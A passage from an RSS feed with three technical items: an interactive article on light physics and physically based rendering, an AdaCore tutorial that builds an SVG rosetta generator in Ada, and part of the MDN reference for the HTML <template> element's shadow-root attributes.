            <description><![CDATA[In this interactive article, we will explore the physical phenomena that create light and the fundamental laws governing its interaction with matter. We will learn how our human eyes capture light and how our brains interpret it as visual information. We will then model approximations of these physical interactions and learn how to create physically realistic renderings of various materials.]]></description>
            <content:encoded><![CDATA[
    
    
    In this interactive article, we will explore the physical phenomena that create light and the fundamental laws governing its interaction with matter. We will learn how our human eyes capture light and how our brains interpret it as visual information. We will then model approximations of these physical interactions and learn how to create physically realistic renderings of various materials.
    Chapter 1: What is light?
    We are all familiar with light: it’s the thing that allows us to see the world, distinguish colors and textures, and keeps the universe from being a dark, lifeless void. But precisely defining what light is has proven to be a tricky question.Throughout history, many philosophers (and later, physicists) studied light in an effort to demystify its nature. Some ancient Greeks considered it to be one of the four fundamental elements that composed the universe: beams of fire emanating from our eyes.
    Descartes proposed that light behaved like waves, while Newton thought that it consisted of tiny particles of matter called corpuscles.

    Each of these more or less scientific theories explained some aspects of light's behavior, but none could account for all of them in a single, unified framework. That was until the 1920s when physicists came up with quantum electrodynamics. This theory is, as of now, the most accurate way to describe every interaction of light and matter.

    You can hover the diagram below to see which light's phenomena can be explained using each model:


    
            Quantum Optics
            
                Electromagnetic Optics
                
                    Wave Optics
                    
                        Ray Optics
                    
                
            
        
    
        
            Reflection / Refraction / Transmission
            Diffraction
            Interference
            Polarization
            Dispersion
            Fluorescence
            Phosphorescence
        
    

    

    For the purpose of computer graphics, the ray optics model is accurate enough at simulating light interactions. But for the sake of scientific curiosity, we will explore some aspects of the other models, starting with electromagnetism.

    The Electric force
    One of the fundamental properties of matter is the electric charge, and it comes in two types: positive and negative.Charges determine how particles interact: charges of the same type repel each other, while opposite charges attract.
    The amount of force affecting two charged particles is calculated using Coulomb's law:
    


    Where  is a constant,   and  are the quantities of each charge, and  is the distance between them.

    You can drag around these charges to see how the electric force affects them:
    
    Every charge contributes to the electric field, it represents the force exerted on other charges at each point in space. We can visualize the electric field with a  or a  :
    
    
    Another way to visualize the electric field is by coloring each point in space with a color gradient representing the force experienced by a small charge at that point:
    

    Special relativity and magnetism
    Imagine a moving object carrying a positive electric charge placed under a cable carrying an electrical current.
    From , the object and the negative charges in the wire are moving, and since the positive and negative charges in the cable compensate each other, the object doesn't experience any force.
    In the , it appears to be static alongside the negative charges, while the positive charges are moving to the left, and the object still doesn't get affected by any force.
    Now if we take into account , the moving charges in the wire appear "stretched" due to relativistic effects, causing a change in the distribution of charges. This stretching leads to a repulsive force between the object and the wire, which we interpret as magnetism.
    
    
    Maxwell's equations
    Maxwell's equations describe how electric and magnetic fields are created and interact with each other. We will focus on the third and fourth equations.
    Maxwell's third equation, known as Faraday's law of induction, shows how changing magnetic fields can generate electric currents.An example of this is moving a magnet inside a coil, which induces an electric current in the wire due to the changing magnetic field.
    This is the principle behind electric generators: Mechanical energy (like the flow of steam) is used to move magnets inside coils (a turbine), converting it to electrical energy through electromagnetic induction.
    By moving the magnet left and right, we can see the voltmeter picking up a current and the electric charges in the coil moving back and forth:
    
    
        Show magnetic field
            
        
        Slide the magnet
        
    

    
    Maxwell's fourth and final equation, Ampère's Law, illustrates how electric currents (moving charges) produce magnetic fields around them. This is the basis of how electromagnets function:
    
    
        Voltage: 0 volts
        
    
    
    Together, these laws demonstrate how electric and magnetic fields are interdependent. A changing magnetic field generates an electric field, and a changing electric field generates a magnetic field.
    This continuous cycle enables self-sustaining, self-propagating electromagnetic waves, which can travel through space without requiring a medium.
    Electromagnetic radiation
    Electromagnetic radiation consists of waves created by synchronized oscillations of electric and magnetic fields. These waves travel at the speed of light in a vacuum.
    The amplitude of a wave determines the maximum strength of its electric or magnetic field. It represents the wave's intensity or "brightness". In quantum terms, a higher amplitude corresponds to a greater number of photons.
    The frequency of a wave determines the energy of the individual photons that compose it. Higher frequencies correspond to shorter wavelengths and more energetic photons.
    
    Amplitude
    
    Frequency
    

    When the wavelength falls between approximately 400 nm and 700 nm, the human eye perceives it as visible light.
    While other wavelengths are invisible to the human eye, many are quite familiar in everyday life.
For example, microwaves are used for Wi-Fi and cooking, X-rays are used in medical imaging, and radio waves enable communication.
Some insects, like bees, can see ultraviolet light, which helps them locate flowers by revealing hidden patterns and markings created by specialized pigments, such as flavonoids, that reflect UV wavelengths.
On the other end of the spectrum, gamma rays are highly energetic and can be dangerous, they are generated by radioactive decay, nuclear bombs, and space phenomena like supernovas.
    
    Frequency
    

    Generating Light
    There are many ways for light to be generated, the two most common ones we encounter everyday are incandescence and electroluminescence.

    Incandescence is the process by which a material emits visible light due to high temperature. It is how incandescent lightbulbs and the sun generates light.
    An incandescent lightbulb produces light through the heating of a filament until it starts glowing. The filament is made of tungsten, an element with a high melting point, high durability, and a positive temperature coefficient of resistance, which means its resistance increases with temperature.

    When we increase the current flowing through the filament, it starts heating up (Due to Joule heating), which increases the resistance in turn causing more heat to get dissipated. This feedback loop stabilizes at around 2500°C.

    This heat makes the electrons in the filament wiggle and collide with each other, releasing photons in the process. This radiation can be approximated as Black-body radiation.



Voltage


The Sun also generates light by incandescence, but unlike the lightbulb's filament glowing via Joule heating, the Sun’s energy is produced by nuclear fusion in the core, where hydrogen nuclei fuse to form helium and release photons as gamma rays.These photons travel from the core through the radiative zone, getting absorbed and remitted countless times while shifting to longer wavelengths. After hundreds of thousands of years of bouncing around, the photons make it to the surface of the Sun, called the photosphere, where they get radiated away.
Most (~49%) of the sun's emissions are in infrared, which is responsible for the heat we get on Earth, ~43% is visible light and the ~8% left is ultraviolet.

An interesting fact is that illustrations of the Sun's cross-section typically depict the interior with bright orange or yellow colors. However, if we could actually see a cross-section of the Sun, even the hottest regions like the core would appear dark and opaque, because the radiation generated there isn't in the visible spectrum.





Another way to generate light is by electroluminescence, this is the phenomenon that powers LEDs

The main component of a light-emitting diode is a semiconductor chip. Semiconductors are materials whose electrical conductivity can be modified by mixing them with impurities in a process known as doping.

Depending on the type of impurity (called the dopant) used in the mix, the semiconductor can be turned into either an n-type, which has extra electrons freely moving around, or a p-type, which has a lack of electrons and instead carrying an electron "hole", also moving around and acting as a positive charge.

When you stick a p-type and an n-type semiconductor side by side, they form a p-n junction. When a current flows through the junction, the electrons and the holes recombine and emit photons in the process.


Aside from incandescence and electroluminescence, which are the two most common sources of light we encounter in everyday life, light can come from other places. Some materials glow when exposed to ultraviolet radiation, others absorb that radiation and re-emit it after some time. Some animals like fireflies use special enzymes to produce light. You can read this page to learn more about other sources of luminescence.

Chapter 2: Abstracting Away

In the previous chapter, we examined the nature of light and the various methods by which it can be emitted, we will now focus on how it interacts with matter.

When a photon hits a material, it interacts with the electrons in the atoms and molecules of that material, then two things can happen, it can either be absorbed or scattered.

The electrons occupy atomic orbitals: regions around the nucleus of the atom where an electron is most likely to be found. A higher orbital corresponds to a higher energy level of the electron.


If the photon has the energy needed to excite the electron to a higher energy level, the photon can be absorbed. Eventually the electron returns to a lower level and releases the energy as heat.

If the photon does not get absorbed, its electric field will make the electrons oscillate in return and generate secondary waves that interfere constructively and destructively with the photon waves in complicated ways.

We can simplify these complicated interactions by making a few assumptions about the material:

    The material is homogeneous, as in the material has the same properties everywhere
    The material is a perfectly smooth surface

We can use Maxwell's equations to show that such a perfect flat material splits the incoming light waves into two parts: reflected and refracted.

The angle of reflection is equal to the angle of incidence relative to the normal of the surface, as per the law of reflection:


        
        Angle 
    


The angle of refraction is determined by how much slower (or faster) light travels through the material, that speed is defined by the index of refraction, and the angle is calculated using Snell's law:






        
        
        
        Angle 
        Index of refraction 
        Index of refraction 
    


At a  and refractive indices light is no longer refracted and seems to disappear.

The amount of light that is reflected and refracted is calculated using Fresnel equations.

However, computing the full Fresnel equation in real time can be slow, so in 1994 Christophe Schlick came up with an approximation.
First we compute the reflectance at zero degrees from the normal:


Then we plug  in the approximation function for the reflectance:


The transmitted (or refracted) light simply becomes:



        
        
        Angle 
        Index of refraction 
        Index of refraction 
    

If we try the  where the refracted ray disappeared, we can now see it getting reflected back inside the medium, this is called total internal reflection.

Total internal reflection gives rise to an interesting phenomenon called Snell's window. If you dive underwater and look up, the light above the surface is refracted through a circular window 96 degrees wide, and everything outside is a reflection of the bottom of the water.


Angle



This is what it looks underwater:




The Microfacet Model

Like we saw earlier, we can explain light reflecting and refracting using different models, depending on the size of the surface irregularities we are considering.
For example, wave optics explains light interacting with matter as light waves diffracting on the surface nanogeometry.
If we zoom out a bit and use ray optics, we consider light as straight line rays that reflect and refract on the surface microgeometry. With this model we can use the optical laws we described earlier: law of reflection, Snell's law, Fresnel equations.
Now for rendering, we can zoom out even further and consider one pixel at a time, each pixel contains many microgeometry surfaces that we call a microfacet. We can use a statistical average of the microfacets in a pixel to simulate the appearance of the surface at that pixel, without considering each individual microfacet which would be unfeasible in real time.

    
        Size
        Model
        Phenomenon
    
    
        Nanogeometry
        Wave optics
        Light diffraction
    
    
        Microgeometry
        Ray optics
        Reflection/refraction, change in local normal
    
    
        Macrogeometry
        BRDF
        Statistical average over a pixel, wider cone -> more roughness
    


Here we can see a microgeometry surface, changing the roughness makes it more bumpy and the microfacets normals aren't aligned anymore:

Roughness


At the macrogeometry level, a bigger roughness value means light rays have a wider cone where they can spread out. The function that describes this cone is called bidirectional reflectance distribution function, we will discuss it in the next chapter.

Roughness


In our microfacet model, we distinguish two types of materials by the nature of their interaction with light: metals and non-metals.

Metals

Metals have a sea of free electrons that absorb light very easily when the photons enter a few nanometers deep inside the surface. The light that isn't absorbed is reflected equally across the visible light spectrum, this is why metals have that distinct "silvery" gray color.
Notable exceptions are gold, copper, osmium and caesium.



Changing the roughness of a metal only changes its specular reflection, making it more or less mirror-like. But there is no diffuse reflection at all.

Roughness


Non-metals

Also called dielectrics, these are materials that do not conduct electricity (insulators). They include plastic, wood, glass, water, diamond, air...



When a photon hits a dielectric material, it only gets absorbed if it's energy matches the electron's energy in the material. So light either gets reflected, and the specular reflection depends on the roughness of the surface.
The light can also get refracted inside the dielectric material, it bounces around and interacts with the pigments inside the material until it exits the surface, this is called diffuse reflection.


Roughness


Spectral Power Distribution

If we take the example of a red apple. When we shine a white light (which contains all visible wavelengths) on it, the apple's pigments (anthocyanins) absorb most of the wavelengths like violet, blue and green wavelengths, thus decreasing the intensity of those colors from the light. The remaining wavelengths, mostly red, gets scattered off the apple's surface making us perceive the apple as red.



We can characterize the incoming light by describing the amount of energy it carries at each wavelength using a function called the Spectral Power Distribution or SPD for short.
For example, below is the SPD for D65, a theoretical source of light standardized by The International Commission on Illumination (CIE). It represents the spectrum of average midday light in Western Europe or North America:

We can compare this SPD to AM0, which is the measured solar radiation in outer space before entering Earth's atmosphere. Notice the absence of a dip in the ultraviolet range:


And here is the SPD of a typical tungsten incandescent light:


Spectral Reflectance Curve
The SPD shows us how much of each "color" a light is composed of. Another interesting function we can look at is called the spectral reflectance curve, which shows the fraction of incident light reflected by an object at each wavelength, effectivly representing the color of said object.
Going back to our apple example, since it reflects most of its light in the red wavelength, its spectral reflectance curve might look like this:


The light we see is the combination of the light spectral power distribution with the object spectral reflectance.
If we shine a light on our red apple, depending on the wavelengths of the light, the final color we see changes. A  makes the apple appear red, because it's like multiplying the apple's color by one. We get the same result with a , because the apple reflects mostly in the red spectrum.However if we shine a , besides the leaf, the rest of the apple doesn't reflect any light, thus appearing black.
On the top right you can see the SPD of the flashlight, under it the reflectance curve of the apple, and the resulting reflected light below it:



If we now add a banana and shine a , we can obviously tell the apple and the banana apart, one being red while the other is yellow.But what happens when the light is ? Both objects appear reddish to our eyes, because the banana doesn't have any green light to reflect, making it lose its yellow color. This phenomenon is called metamerism.
You can display the  or the  :





There are different types of metamerism, depending on when it happens during the light transport process. The apple and banana example is called illuminant metamerism, where objects that reflect light differently appear the same under some specific illumination.
Observer metamerism is when objects appear different between observers, a good example of this is colorblindness.

Chapter 3 : The Rendering equation




 is the outgoing light at point  to the direction 
 is the incoming light at point  from the direction 
The BRDF (Bidirectional reflectance distribution function) is a function that tells use how much of the incoming light  is reflected to the outgoing direction  at point , this function characterizes the surface of our material.
The dot product is called the cosine term.




The rendering equation gives us the light reflected towards a direction  at a point  by summing all the incoming lights  at that point coming from direction  in the hemisphere , weighted by the BRDF at that point and the cosine term.

Let's peel off this equation step by step, starting with the easiest part:

Lambert's cosine law

When a beam of light hits a surface, the area it touches is inversly proportional to the cosine of the angle of incidence. When the angle of incidence is , the area is at minimum and the intensity is concentrated, but the more  the angle gets, the larger the area and the intensity gets spread out.



Angle


The BRDF

The BRDF is arguably the most important part of the rendering equation, it characterizes the surface of our material and its appearance. This is where the we can apply the microfacet theory and energy conservation to make our rendering model physically based.

It takes as input the incoming  and outgoing  light direction, and the roughness of the surface . It equals the diffuse and the specular components weighted by their respective coefficients  and .
There are many different BRDFs, the most common in realtime rendering is the Cook-Torrance specular microfacet model combined with Lambertian diffuse model.



The lambertian diffuse component is the diffuse color, called albedo, multiplied by the cosine factor. But since we already have the cosine factor in the rendering equation, the diffuse equation becomes: 



The Cook-Torrance specular component itself has three components: the normal distribution function , the geometric function  and the Fresnel equation .

Normal Distribution Function

The normal distribution function is an approximation of the number of microfacets oriented in such a way that they will reflect light from the incoming direction  to the outgoing direction .

The one we will use is the Trowbridge-Reitz GGX function:



 is the halfway vector between the incoming and outgoing directions, we calculate it like this:




Roughness


Geometric Function

Some incoming rays get occluded by some microfacets before they get a chance to bounce off to the outgoing direction, this is called shadowing. Other rays get occluded by microfacets on their way to the outgoing direction, this is called masking. The geometric function approximates this effect.

Here we can see the shadowed rays in red and the masked rays in blue. The yellow rays succesfully reflected to the outgoing direction:

Angle


We will use the Schlick-GGX geometric function:




Where:



Roughness


Fresnel Equation

Like we discussed in the previous chapter, we will use the Fresnel-Schlick approximation which is fast for realtime rendering and accurate enough:



Base reflectance F0


Combining everything

Now we can combine the diffuse and specular components to get our final PBR render:


Roughness
    Metallic
    Albedo


Here is a grid of spheres with different roughness and metallic values on each axis:


Usually the metallic values is either 0 or 1, but it is useful in PBR rendering to consider intermediate values to smoothly interpolate between metals and non-metals. Take this rusted metal material for example:


To be continued...

Physically based rendering is a very vast topic and there is a lot more to cover.
In the chapter about the physics of light, I omitted the quantum explanation of light's behaviour using probability amplitudes. We didn't talk about the double slit experiment or the wave-particle duality. I may cover this in the future when I learn more about it, for now I'll leave you with this quote from Richard Feynman's QED book:
The theory of quantum electrodynamics describes Nature as absurd from the point of view of common sense. And it agrees fully with experiment. So I hope you accept Nature as She is — absurd.


We didn't talk about polarization and assumed all our light sources are unpolarized, this isn't very important for general rendering but can be useful for research.

We focused on surface rendering, in the future I will cover volume rendering, subsurface scattering, effects like optical dispersion, thin-film interference/iridescence...etc

There are a lot more implementation specific details. Whether we are implementing PBR in raytracing or rasterization, we need to use optimization techniques to make the rendering faster while still being accurate. Examples that come to mind are prefiltred envmaps and importance sampling (or efficient sampling in general).

Further reading
This article is mainly based on this SIGGRAPH talk by Naty Hoffman and Physically Based Rendering: From Theory To Implementation
My main inspiration for writing interactive articles is this fantastic blog by Bartosz Ciechanowski. A lot of interactive demos in this article are similar to the ones in this post.
Other resources include LearnOpenGL, the ScienceClic youtube channel, and 3Blue1Brown of course.
I can't recommend enough the famous book QED: The Strange Theory of Light and Matter by Richard Feynman.

]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Introduction to Ada: a project-based exploration with rosettas]]></title>
            <link>https://blog.adacore.com/introduction-to-ada-a-project-based-exploration-with-rosettas</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45106314</guid>
            <description><![CDATA[by Romain Gora – Sep 01, 2025. Discover Ada through a fun, project-based tutorial! Learn the language’s clarity, safety, and modern features while building an SVG rosetta generator. A fresh, visual way to explore Ada 2022.]]></description>
            <content:encoded><![CDATA[ContextThis practical walkthrough, designed as a short tutorial, was created upon joining AdaCore as a Field Engineer. In this new role, I’ll be working directly with customers to help them succeed with Ada. Although I was first introduced to the language nearly two decades ago, this new position inspired me to revisit its fundamentals, and I used the excellent https://learn.adacore.com portal as a quick refresher.While that platform takes a concept-based approach, I chose to complement it with a project-based method by developing a small, end-to-end Ada program that generates animated rosettas in the form of SVG files. These are technically hypotrochoid curves, producing patterns that many will recognize from the classic Spirograph™ toy.In this walkthrough, we’ll show that Ada can be fun and easy to learn. Although the language is famous for safety-critical systems, we will use it as a modern, general-purpose programming language and try out some new features from Ada 2022 along the way.Let's dive in!A brief note on AdaThis section leans a bit more into background context, with a slightly encyclopedic flavor that's especially useful for readers new to Ada. If you're already familiar with Ada’s history and principles, feel free to joyfully skip ahead to the next section!Ada was created in the late 1970s after a call from the U.S. Department of Defense to unify its fragmented software landscape. The winning proposal became Ada, a language that's been literally battle-tested (!) and built on a deeply thought-out design that continues to evolve today.While Ada is absolutely a general-purpose programming language, it has carved out a strong niche in fields where software correctness and reliability are mission-critical:Embedded and real-time systemsAerospace and defenseRail, automotive, and aviationAny system where failure is not just a bug, but a riskIts strict compile-time checks, safety features, and clear structure make it particularly appealing when you need your software to be dependable from day one and still maintainable ten years later.Ada's design is grounded in a strong and principled philosophy:Readability over conciseness: Ada favors clarity. It avoids symbols and abbreviations in favor of full keywords, making the language more accessible and less error-prone.Strong and explicit typing: It is extremely easy to declare new types in Ada, with precise constraints, which makes it much harder to accidentally misuse data. While some functional languages share this strong typing discipline, Ada stands out by requiring the programmer to be very explicit. It uses little to no type inference.Explicit is better than implicit: Unlike many modern languages that prioritize convenience, Ada leans heavily toward precision. Most types must be explicitly named and matched.Defined semantics and minimal undefined behavior: Ada offers a level of predictability and safety unmatched in many languages. This makes it a strong choice not only for safety-critical systems, but also for codebases where long-term maintenance, verifiability, and correctness are essential.Compiler as a partner: Ada compilers are strict by design, not to frustrate, but to help the programmer write clearer, more correct code. This philosophy encourages the developer to communicate intent clearly, both to the compiler and to future readers.How the program worksSometimes the best way to figure out how something works is to start at the end. Let's do that!In this tutorial, we'll walk through how the program produces its final output — a rosetta SVG file — and use that as a way to explore how Ada's structure, type system, and tooling come together.This is a simple command-line program that generates an SVG file. You run it like this:./bin/rosettaThe idea was to create something visual: learning is more fun when there's an immediate, satisfying result and generating rosettas fits that goal perfectly.Why SVG? Because it's a lightweight and portable vector format that you can view in any modern browser. I wanted to avoid relying on a graphical library, which would have added extra weight and gone beyond the scope of this approach. And while XML isn't the most pleasant format to write by hand, generating it from code is straightforward and gives a surprisingly clean result.Tooling & setupTo build and run the project, I used Alire, the Ada package manager. It plays a similar role in the Ada ecosystem as Cargo does for Rust or npm for JavaScript. It's well-documented, and while we won't dive deep into it here, it's a solid and accessible way to manage Ada projects. I encourage anyone curious to get it from https://alire.ada.dev. Interestingly, "Alire" is also the French expression for "à lire" — which means "for reading." A fitting name for a tool that supports a language so focused on clarity and readability!Once Alire is set up, the natural next step is choosing where to write the code. You have two excellent options for your development environment. For a dedicated experience, you can download the latest release of GNAT Studio from its GitHub repository. If you prefer a more general-purpose editor, you can install the official Ada & SPARK for Visual Studio Code extension from AdaCore.As a new learner, I also kept https://learn.adacore.com close at hand. It’s a particularly clear and comprehensive resource — and I especially appreciated being able to download the ebook version and read through it on my phone.Entry pointwith Rosetta_Renderer;

procedure Main is
begin
   Rosetta_Renderer.Put_SVG_Rosettas;
end Main;There are several interesting things to notice right away:The with clause is not a preprocessor directive like in C or C++. It’s a compiled, checked reference to another package — a reliable and explicit way to express a dependency. This eliminates entire classes of bugs related to fragile #include chains, macro collisions, or dependency order issues.This procedure is not a function: it does not return a value. In Ada, procedures are used to perform actions (like printing or modifying state), and functions are used to compute and query values.The syntax is designed for readability. You’ll find begin and end here instead of {} as in C/C++, reinforcing Ada’s philosophy that clarity matters more than brevity.Put_SVG_Rosettas uses the idiomatic Pascal_Snake_Case naming style. This reflects a common Ada convention and avoids acronyms or compressed identifiers in favor of more descriptive names.The entry point is minimal but meaningful: it simply calls a procedure which generates the output we'll explore in the next sections.Geometry and computation (package Rosetta)In Ada, a package is a modular unit that groups related types, procedures, and functions. Following the convention from GNAT (the Ada compiler, part of the GNU Compiler Collection, fondly known as GCC), each package has a specification file (with the .ads extension — short for Ada Specification) and an implementation file (with the .adb extension — short for Ada Body). This clear and enforced split means you always know where to find interface definitions versus their implementation.The following code is the package specification for Rosetta. It defines the data types for the rosetta shapes and declares the public interface of operations available to manipulate them.with Ada.Strings.Text_Buffers;

package Rosetta is

   --  A mathematical description of a rosetta (specifically, a hypotrochoid).
   --  formed by tracing a point attached to a circle rolling inside another circle.
   type Hypotrochoid is record
      Outer_Radius : Float;     --  Radius of the fixed outer circle.
      Inner_Radius : Float;     --  Radius of the rolling inner circle.
      Pen_Offset   : Float;     --  From the center of the inner circle to the drawing point.
      Steps        : Positive;  --  Number of steps (points) used to approximate the curve.
   end record;

   --  A 2D coordinate in Cartesian space.
   type Coordinate is record
      X_Coord, Y_Coord : Float;
   end record
     with Put_Image => Put_Image_Coordinate;
   
   --  Redefines the 'Image attribute for Coordinate.
   procedure Put_Image_Coordinate 
     (Output : in out Ada.Strings.Text_Buffers.Root_Buffer_Type'Class; 
      Value  : Coordinate);

   --  A type for an unconstrained array of 2D points forming a curve.
   --  The actual bounds are set when an array object of this type is declared.
   type Coordinate_Array is array (Natural range <>) of Coordinate;

   --  Computes the coordinates of the rosetta curve defined by Curve (a hypotrochoid).
   --  Returns a centered array of coordinates.
   function Compute_Points (Curve : Hypotrochoid) return Coordinate_Array;

end Rosetta;The Rosetta package is responsible for all the math and curve computation. It defines:Hypotrochoid, type describing the geometry of the rosettaCoordinate, type representing points in 2D spaceCoordinate_Array, type holding a series of such pointsCompute_Points, function which calculates all the points of the curve based on the Hypotrochoid parameters and recenters them around the originThis package is focused solely on computation. It doesn’t concern itself with how the result is rendered.Fun fact for the curious: when the rolling circle rolls outside the fixed circle rather than inside, the resulting curve is called an epitrochoid.In Ada, a record is similar to a struct in C or a class with only data members in other languages. It's a user-defined type composed of named components, making it ideal for modeling structured data.Using a record for Hypotrochoid was particularly appropriate: it allows grouping all geometric parameters (outer radius, inner radius, pen offset, and steps) into a single, cohesive unit. This improves readability and maintainability. The compiler enforces correctness by ensuring all required values are present and of the expected type — reinforcing Ada’s philosophy of clarity and safety.The type Coordinate_Array is an unconstrained array type that holds a range of Coordinate records. In this context, ‘unconstrained’ simply means that we don’t define the array’s size when we declare the type. Instead, the size is defined when we declare an object of that type. This gives us the flexibility to use this type for a variety of shapes.You may also notice the use of Natural range <>. Natural is a predefined subtype of Integer that only allows non-negative values. And yes, I mean subtype: Ada’s powerful type system allows you to take an existing type and create a more specific, constrained version of it.Highlights from the .adb fileHere are a few notable aspects from the implementation (rosetta.adb) that illustrate Ada’s strengths for writing safe, clear, and structured code:Declarative and modular design: Both Generate_Point and Compute_Points are pure functions that operate only on their inputs. Their behavior is fully deterministic and encapsulated.Safe bounds and array handling: The Points array is statically bounded using (0 .. Curve.Steps), and its access is strictly safe. The compiler ensures that any index outside this range would raise an error at runtime. This immediate error is a feature, not a bug. It stops silent memory corruption and security flaws by ensuring the program fails predictably and safely at the source of the problem.Use of constants for robustness: Variables such as Pi, R_Diff, and Ratio are declared as constant, enforcing immutability. This helps ensure clarity of intent and prevents accidental reassignment, a common source of subtle bugs in more permissive languages. Ada encourages this explicit declaration style, promoting safer code.with Ada.Numerics;
with Ada.Numerics.Elementary_Functions;

use Ada.Numerics;
use Ada.Numerics.Elementary_Functions;

package body Rosetta is

   --  Computes a single point on the hypotrochoid curve for a given angle Theta.
   --  Uses the standard parametric equation of a hypotrochoid.
   function Generate_Point (Curve : Hypotrochoid; Theta : Float) return Coordinate is
      R_Diff : constant Float := Curve.Outer_Radius - Curve.Inner_Radius;
      Ratio  : constant Float := R_Diff / Curve.Inner_Radius;
   begin
      return (
              X_Coord => R_Diff * Cos (Theta) + Curve.Pen_Offset * Cos (Ratio * Theta),
              Y_Coord => R_Diff * Sin (Theta) - Curve.Pen_Offset * Sin (Ratio * Theta)
             );
   end Generate_Point;

   --  Computes all the points of the hypotrochoid curve and recenters them.
   --  The result is an array of coordinates centered around the origin.
   function Compute_Points (Curve : Hypotrochoid) return Coordinate_Array is
      Points : Coordinate_Array (0 .. Curve.Steps);
      Max_X  : Float := Float'First;
      Min_X  : Float := Float'Last;
      Max_Y  : Float := Float'First;
      Min_Y  : Float := Float'Last;
      Offset : Coordinate;
   begin
      --  Computes raw points and updates the bounding box extents.
      for J in 0 .. Curve.Steps loop
         declare
            Theta : constant Float := 2.0 * Pi * Float (J) / Float (Curve.Steps) * 50.0;
            P     : constant Coordinate := Generate_Point (Curve, Theta);
         begin
            Points (J) := P;
            Max_X := Float'Max (Max_X, P.X_Coord);
            Min_X := Float'Min (Min_X, P.X_Coord);
            Max_Y := Float'Max (Max_Y, P.Y_Coord);
            Min_Y := Float'Min (Min_Y, P.Y_Coord);
         end;
      end loop;

      --  Computes the center offset based on the bounding box.
      Offset := (
                 X_Coord => (Max_X + Min_X) / 2.0,
                 Y_Coord => (Max_Y + Min_Y) / 2.0
                );

      --  Recenters all points by subtracting the center offset.
      for J in Points'Range loop
         Points (J).X_Coord := @ - Offset.X_Coord;
         Points (J).Y_Coord := @ - Offset.Y_Coord;
      end loop;

      return Points;
   end Compute_Points;
   
   --  Redefines the 'Image attribute for Coordinate.
   procedure Put_Image_Coordinate
     (Output : in out Ada.Strings.Text_Buffers.Root_Buffer_Type'Class;
      Value  : Coordinate)
   is   
      X_Text : constant String := Float'Image (Value.X_Coord);
      Y_Text : constant String := Float'Image (Value.Y_Coord);
   begin
      Output.Put (X_Text & "," & Y_Text);
   end Put_Image_Coordinate;

end Rosetta;On style: strict and predictable (and satisfying!)Ada is one of those rare languages that not only compiles your code but asks you to write it properly. With the compiler switch -gnaty, you can enforce a comprehensive set of style rules, many of which are stricter than what you'd see in most languages.This includes things like:No trailing whitespace at the end of linesNo consecutive blank linesProper indentation and alignment of keywords and parametersA space before “(“ when calling a procedure or functionConsistent casingAt first, this can feel surprisingly strict. But once you get used to it, the benefits are clear: it helps enforce a consistent and clean coding style across a codebase. That in turn improves readability, reduces ambiguity, and leads to more maintainable programs.Rather than leaving formatting up to personal taste or optional linter tools, Ada integrates this attention to detail into the compilation process itself. The result is not only more elegant: it's genuinely satisfying. And you can do even more with GNATcheck and GNATformat but it’s outside of the scope of this post.Outputting to SVG (package Rosetta_Renderer)The Rosetta_Renderer package is responsible for producing the SVG output. It defines a single high-level procedure:package Rosetta_Renderer is

   --  Renders a predefined set of rosettas into an SVG output.
   procedure Put_SVG_Rosettas;

end Rosetta_Renderer;This procedure generates an SVG file directly. It takes care of formatting the SVG structure (header, shapes, animations, and footer) and calls into the math logic defined in the Rosetta package to generate point data.This separation of concerns is deliberate and beneficial: the math logic doesn’t need to know anything about SVG, and the renderer doesn’t care how the coordinates were generated.Now let's talk about the body of the package... but not for long. We're keeping it brief because its core is essentially the SVG plumbing required to draw and animate the curves, so we'll skip the fine details. And for those who enjoy seeing how the sausage is made, I've made the fully commented source code available for you right here.The procedure Put_Path handles the creation of the SVG path. Its main job is to take an array of coordinates and write the corresponding command string to the d attribute of a <path> element. In SVG, this attribute defines the geometry of the shape. The code iterates over each coordinate, using M (moveto) for the first point and L (lineto) for all the others to draw the connecting lines.--  Puts coordinates to a single SVG path string ("d" attribute).
   procedure Put_Path (Stream : File_Type; Points : Coordinate_Array) is
   begin
      Put (Stream, "M "); -- Moves the pen without drawing.
      for J in Points'Range loop
         declare 
            Coord_Text : constant String := Coordinate'Image (Points (J));
         begin   
            Put (Stream, Coord_Text);
            if J < Points'Last then
               Put (Stream, " L "); --  Draws a line.
            end if;
         end;
      end loop;
   end Put_Path;AfterwordThis small project was an enjoyable and useful way to get back into Ada. It helped me reconnect with the language’s main strengths and refamiliarize myself with its tools and design. It was a great reminder of how fun, easy to learn, and remarkably modern Ada can be, especially for developers focused on building robust, maintainable, and efficient software.I hope this short walkthrough gives a good idea of that feeling, whether you're already into Ada or just starting to explore it.]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[<template>: The Content Template element]]></title>
            <link>https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/template</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45106049</guid>
            <description><![CDATA[The <template> HTML element serves as a mechanism for holding HTML fragments, which can either be used later via JavaScript or generated immediately into shadow DOM.]]></description>
            <content:encoded><![CDATA[
            
            
    Attributes
    This element includes the global attributes.

shadowrootmode

Creates a shadow root for the parent element.
It is a declarative version of the Element.attachShadow() method and accepts the same enumerated values.

open

Exposes the internal shadow root DOM for JavaScript (recommended for most use cases).

closed

Hides the internal shadow root DOM from JavaScript.


Note:
The HTML parser creates a ShadowRoot object in the DOM for the first <template> in a node with this attribute set to an allowed value.
If the attribute is not set, or not set to an allowed value — or if a ShadowRoot has already been declaratively created in the same parent — then an HTMLTemplateElement is constructed.
A HTMLTemplateElement cannot subsequently be changed into a shadow root after parsing, for example, by setting HTMLTemplateElement.shadowRootMode.
Note:
You may find the non-standard shadowroot attribute in older tutorials and examples that used to be supported in Chrome 90-110. This attribute has since been removed and replaced by the standard shadowrootmode attribute.

shadowrootclonable

Sets the value of the clonable property of a ShadowRoot created using this element to true.
If set, a clone of the shadow host (the parent element of this <template>) created with Node.cloneNode() or Document.importNode() will include a shadow root in the copy.

shadowrootdelegatesfocus

Sets the value of the delegatesFocus property of a ShadowRoot created using this element to true.
If this is set and a non-focusable element in the shadow tree is selected, then focus is delegated to the first focusable element in the tree.
The value defaults to false.

shadowrootserializable 
Experimental


Sets the value of the serializable property of a ShadowRoot created using this element to true.
If set, the shadow root may be serialized by calling the Element.getHTML() or ShadowRoot.getHTML() methods with the options.serializableShadowRoots parameter set true.
The value defaults to false.


  
    Usage notes
